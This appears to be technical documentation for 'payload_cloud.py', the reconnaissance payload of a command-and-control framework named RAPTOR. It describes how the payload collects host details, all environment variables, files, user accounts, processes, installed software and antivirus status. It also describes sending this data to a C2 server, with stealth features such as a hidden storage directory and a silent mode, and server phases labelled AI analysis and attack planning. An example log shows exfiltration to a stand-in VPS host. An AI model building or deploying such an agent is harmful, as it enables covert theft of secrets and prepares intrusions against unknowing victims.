# Payload Documentation - RAPTOR Cloud C2

## Overview
The `payload_cloud.py` is a reconnaissance agent designed to gather comprehensive system information and send it to a remote C2 (Command & Control) server. It performs automated enumeration of system resources, network configurations, security controls, and sensitive data locations.

---

## Data Collection Categories

### 1. **System Information**
Basic system and hardware information.

**Data Collected:**
- Hostname
- Operating System (name, version, release)
- System Architecture
- Processor Information
- Current Username
- Admin/Root Privileges Status
- Python Version
- CPU Count
- Total RAM (GB)
- Total Disk Space (GB)
- System Boot Time
- Environment Variables (all)

**Collection Method:**
- `socket.gethostname()` - Gets machine hostname
- `platform.system()`, `platform.version()`, `platform.release()` - OS information
- `platform.machine()`, `platform.processor()` - Hardware details
- `os.getlogin()` or `os.environ.get('USER')` - Current user
- `os.getuid() == 0` (Unix) - Root privilege check
- `psutil.cpu_count()` - CPU cores
- `psutil.virtual_memory().total` - RAM
- `psutil.disk_usage('/')` - Disk space
- `psutil.boot_time()` - System uptime
- `os.environ` - All environment variables

**Function:** `gather_system_info()`

---

### 2. **File Enumeration**
Discovers and catalogs files from target directories.

**Data Collected:**
- Filename
- Full Path
- File Size (bytes)
- Creation Date
- Modification Date
- File Extension
- Hidden File Status

**Collection Method:**
- `os.walk()` - Recursive directory traversal
- `Path.stat()` - File metadata (size, timestamps)
- `Path.suffix` - File extension
- Depth-limited traversal to avoid excessive enumeration
- Permission-aware (skips inaccessible files)

**Target Directories:**
- **Windows:** Documents, Desktop, Downloads, AppData/Roaming, C:/ProgramData
- **macOS:** Documents, Desktop, Downloads, Library
- **Linux:** Documents, Desktop, Downloads, .config, /etc, /var/log

**Configuration:**
- `MAX_FILES`: Maximum files to enumerate (default: 1000)
- `MAX_DEPTH`: Maximum directory depth (default: 5)

**Function:** `enumerate_files()`

---

### 3. **Network Information**
Comprehensive network interface and addressing information.

**Data Collected:**
- Network Interface Names
- IPv4/IPv6 Addresses
- Subnet Masks
- Broadcast Addresses
- All IP Addresses (list)
- Subnet CIDR Notations

**Collection Method:**
- `psutil.net_if_addrs()` - Enumerates all network interfaces
- `socket.AF_INET`, `socket.AF_INET6` - Identifies address family (IPv4/IPv6)
- Extracts address, netmask, and broadcast for each interface
- Builds comprehensive interface mapping with all associated addresses

**Function:** `get_network_info()`

---

### 4. **Listening Ports**
Identifies all ports listening for incoming connections.

**Data Collected:**
- Port Number
- Listening Address
- Protocol Family (IPv4/IPv6)
- Process ID (PID)
- Process Name
- Process Executable Path

**Collection Method:**
- `psutil.net_connections(kind='inet')` - Enumerates all network connections
- Filters for `status == 'LISTEN'` - Only listening ports
- `psutil.Process(pid)` - Retrieves process information for each port
- `process.name()`, `process.exe()` - Gets process details

**Configuration:**
- `ENABLE_PORT_SCAN`: Enable/disable port enumeration

**Function:** `get_listening_ports()`

---

### 5. **Network Connections**
Enumerates all active network connections.

**Data Collected:**
- Local Address (IP:Port)
- Remote Address (IP:Port)
- Connection Status (ESTABLISHED, LISTEN, TIME_WAIT, etc.)
- Process ID
- Process Name

**Collection Method:**
- `psutil.net_connections(kind='inet')` - All TCP/UDP connections
- Captures both local and remote endpoints
- Maps connections to owning processes
- Includes connection state information

**Configuration:**
- `ENABLE_NETWORK_ENUM`: Enable/disable network enumeration

**Function:** `get_network_connections()`

---

### 6. **Firewall Status**
Detects and reports firewall configuration.

**Data Collected:**
- Firewall Detected (Yes/No)
- Firewall Name/Type
- Enabled/Disabled Status
- Rules Count (if available)

**Collection Method (OS-Specific):**

**Windows:**
- `netsh advfirewall show allprofiles` - Queries Windows Defender Firewall
- Parses output for state (ON/OFF)

**Linux:**
- Checks for `ufw` (Uncomplicated Firewall): `ufw status`
- Checks for `iptables`: `iptables -L -n`
- Checks for `firewalld`: `firewall-cmd --state`
- Uses first detected firewall

**macOS:**
- `pfctl -s info` - Queries Packet Filter (pf)
- Parses for enabled/disabled state

**Function:** `get_firewall_status()`

---

### 7. **User Accounts**
Enumerates system users and identifies privileged accounts.

**Data Collected:**
- Current User
- All User Accounts (list)
- Privileged/Admin Users (list)
- Active/Logged-In Users (with session details)

**Collection Method (OS-Specific):**

**Windows:**
- `net user` - Lists all local users
- `net localgroup Administrators` - Lists admin group members
- `psutil.users()` - Active sessions

**Linux:**
- `/etc/passwd` - Reads all user accounts
- Filters by UID (≥1000 for regular users, 0 for root)
- `getent group sudo` - Lists sudo group members
- `psutil.users()` - Active sessions

**Active User Details:**
- Username
- Terminal
- Host (remote or local)
- Session Start Time

**Function:** `get_user_accounts()`

---

### 8. **Running Processes**
Catalogs all currently running processes.

**Data Collected:**
- Process ID (PID)
- Process Name
- Username (owner)
- CPU Usage (%)
- Memory Usage (%)
- Process Status
- Creation Time
- Executable Path

**Collection Method:**
- `psutil.process_iter()` - Iterates all running processes
- Retrieves process attributes: pid, name, username, cpu_percent, memory_percent, status, create_time
- `proc.exe()` - Gets executable path (with permission handling)
- Handles access denied gracefully for protected processes

**Configuration:**
- `ENABLE_PROCESS_ENUM`: Enable/disable process enumeration

**Function:** `get_running_processes()`

---

### 9. **Installed Software**
Enumerates all installed applications and packages.

**Data Collected:**
- Software Name
- Version
- Installation Source (registry/package manager/applications)

**Collection Method (OS-Specific):**

**Windows:**
- `winreg` module - Reads Windows Registry
- Registry paths:
  - `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall`
  - `HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\...\Uninstall` (64-bit apps on 64-bit Windows)
- Extracts DisplayName and DisplayVersion from each entry

**macOS:**
- `glob("/Applications/*.app")` - Lists all .app bundles
- Extracts application names from directory names

**Linux:**
- `dpkg -l` (Debian/Ubuntu)
- `rpm -qa` (RedHat/CentOS/Fedora)
- `pacman -Q` (Arch)
- Uses first available package manager
- Parses package name and version from output

**Configuration:**
- `ENABLE_SOFTWARE_ENUM`: Enable/disable software enumeration

**Function:** `get_installed_software()`

---

### 10. **Antivirus Detection**
Identifies installed and running antivirus software.

**Data Collected:**
- AV Product Name
- Enabled/Disabled Status
- Update Status (if available)
- Running Status

**Collection Method:**

**Windows:**
- `Get-MpComputerStatus` (PowerShell) - Queries Windows Defender status
- Checks for common AV process names:
  - Avira: avgnt.exe, avguard.exe
  - AVG: avgui.exe, avgsvc.exe
  - Bitdefender: bdagent.exe, bdservicehost.exe
  - McAfee: mcshield.exe, mcafee.exe
  - Norton: nortonsecurity.exe, ns.exe
  - Sophos: wrsa.exe, sophoshealth.exe
- `psutil.process_iter()` - Searches for AV processes

**Function:** `detect_antivirus()`

---

## Data Transmission

### C2 Communication
**Endpoint:** `{C2_SERVER}/api/submit_scan/`

**Method:** HTTP POST

**Format:** JSON

**Payload Structure:**
```json
{
  "recon_data": {
    "hostname": "...",
    "os_name": "...",
    "files": [...],
    "open_ports": [...],
    "listening_ports": [...],
    "network_info": {...},
    "firewall": {...},
    "user_accounts": {...},
    "privileged_users": [...],
    "active_users": [...],
    "network_connections": [...],
    "processes": [...],
    "installed_software": [...],
    "antivirus": [...],
    "timestamp": "..."
  }
}
```

**Error Handling:**
- Connection errors (C2 server unreachable)
- Timeouts (default: 30 seconds)
- HTTP status errors
- All errors logged and data saved locally as fallback

**Function:** `send_to_c2()`

---

## Local Data Storage

**Purpose:** Backup reconnaissance data locally if C2 communication fails.

**Location:** `~/.cache/syslog/` (hidden directory)

**Format:** JSON files with timestamp

**Filename:** `recon_YYYYMMDD_HHMMSS.json`

**Configuration:**
- `SAVE_LOCAL_COPY`: Enable/disable local backup
- `LOCAL_LOG_DIR`: Storage directory

**Function:** `save_local_copy()`

---

## Session Status Polling

After successful data transmission, the payload can poll the C2 server for processing status.

**Endpoint:** `{C2_SERVER}/api/session/{session_id}/`

**Method:** HTTP GET

**Polling Configuration:**
- Max attempts: 30
- Interval: 2 seconds
- Timeout per request: 10 seconds

**Status Values:**
- `recon` - Initial reconnaissance phase
- `analysis` - AI analysis in progress
- `attack` - Attack planning phase
- `reporting` - Report generation
- `complete` - Processing finished
- `error` - Error occurred

**Function:** `poll_session_status()`

---

## Configuration Options

| Variable | Default | Description |
|----------|---------|-------------|
| `C2_SERVER` | `http://127.0.0.1:8000` | C2 server address |
| `MAX_FILES` | 1000 | Maximum files to enumerate |
| `MAX_DEPTH` | 5 | Maximum directory depth |
| `ENABLE_PORT_SCAN` | True | Enable port enumeration |
| `ENABLE_NETWORK_ENUM` | True | Enable network connections |
| `ENABLE_PROCESS_ENUM` | True | Enable process enumeration |
| `ENABLE_SOFTWARE_ENUM` | True | Enable software enumeration |
| `SAVE_LOCAL_COPY` | True | Save data locally |
| `SILENT_MODE` | False | Suppress console output |
| `TIMEOUT_SECONDS` | 30 | C2 communication timeout |

---

## Dependencies

**Required Libraries:**
- `psutil` - System and process utilities
- `requests` - HTTP client for C2 communication
- `pytz` (optional) - Timezone handling (for server-side)

**Standard Library:**
- `json`, `os`, `platform`, `socket`, `subprocess`, `sys`, `time`, `datetime`, `pathlib`
- `winreg` (Windows only)

---

## Security Considerations

**Stealth Features:**
- Hidden log directory (`~/.cache/syslog/`)
- Silent mode option (no console output)
- Permission-aware enumeration (graceful handling of access denied)
- Timeout controls to avoid hanging

**Operational Security:**
- All errors handled gracefully
- No destructive operations
- Read-only reconnaissance
- Local backup for offline operation

---

## Execution Flow

1. **Initialize** - Validate configuration, log startup
2. **System Info** - Gather OS and hardware details
3. **File Enumeration** - Discover files in target directories
4. **Port Enumeration** - Identify listening ports
5. **Network Info** - Collect interface and IP information
6. **Firewall Detection** - Check firewall status
7. **User Accounts** - Enumerate users and privileges
8. **Network Connections** - List active connections
9. **Process Enumeration** - Catalog running processes
10. **Software Enumeration** - List installed applications
11. **Antivirus Detection** - Identify security products
12. **Build Payload** - Consolidate all reconnaissance data
13. **Local Backup** - Save data locally
14. **C2 Communication** - Send data to server
15. **Status Polling** - Monitor processing progress
16. **Results Display** - Show final analysis results

---

## Output Example

```
[2025-11-08 14:30:15] [INFO] RAPTOR Payload - Cloud C2 Version
[2025-11-08 14:30:15] [INFO] Gathering system information...
[2025-11-08 14:30:15] [INFO] System info: my-laptop (Linux 5.15.0)
[2025-11-08 14:30:15] [INFO] Enumerated 847 files from 6 directories
[2025-11-08 14:30:16] [INFO] Found 23 listening ports
[2025-11-08 14:30:16] [INFO] Found 3 network interfaces
[2025-11-08 14:30:16] [INFO] Firewall: ufw (enabled)
[2025-11-08 14:30:16] [INFO] Found 8 users (2 privileged, 1 active)
[2025-11-08 14:30:17] [INFO] Found 145 network connections
[2025-11-08 14:30:17] [INFO] Found 198 running processes
[2025-11-08 14:30:18] [INFO] Found 1247 installed software packages
[2025-11-08 14:30:18] [INFO] Detected 0 AV products
[2025-11-08 14:30:18] [INFO] Sending data to C2 server: http://vps.example.com:8000/api/submit_scan/
[2025-11-08 14:30:19] [SUCCESS] ✅ Data sent successfully! Session ID: a1b2c3d4-...
[2025-11-08 14:30:19] [INFO] Session status: complete (attempt 15/30)
[2025-11-08 14:30:19] [SUCCESS] ✅ Session processing complete!
[2025-11-08 14:30:19] [INFO] Risk Level: High
[2025-11-08 14:30:19] [INFO] ✅ Payload execution complete!
```

---

For deployment instructions and C2 server setup, see `CLOUD_DEPLOYMENT_SUMMARY.txt` and `README.md`.
